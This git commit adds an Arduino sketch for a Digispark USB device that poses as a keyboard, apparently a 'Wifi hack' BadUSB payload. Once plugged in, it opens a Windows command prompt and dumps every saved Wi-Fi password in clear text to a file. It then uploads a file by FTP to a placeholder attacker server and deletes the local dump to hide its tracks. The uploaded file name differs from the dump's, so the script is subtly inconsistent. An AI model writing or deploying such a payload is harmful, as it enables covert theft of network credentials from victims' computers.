205d1130a6ebe23011c98f181635f511b2788392
xseahuntergg <81322251+xseahuntergg@users.noreply.github.com>
2021-03-26 21:11:47 +0300

    Add files via upload

---
+++ Wifi_Hack/Kodlar.ino
@@ -0,0 +1,63 @@
+#define kbd_tr_tr
+#include "DigiKeyboard.h"
+
+void setup() {
+  // put your setup code here, to run once:
+
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(600);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("netsh wlan show profile name=\"*\" key=clear > wifipass.txt");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("ftp");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("open ftpserveradresiniz.com");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("username");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("passwd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("put 1237.txt");
+  DigiKeyboard.delay(200);  
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+  DigiKeyboard.print("close");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);    
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("quit");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("del wifipass.txt");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  
+  for (;;){}
+  
+  ///DigiKeyboard.sendKeyStroke(KEY_C , MOD_CONTROL_LEFT)
+}
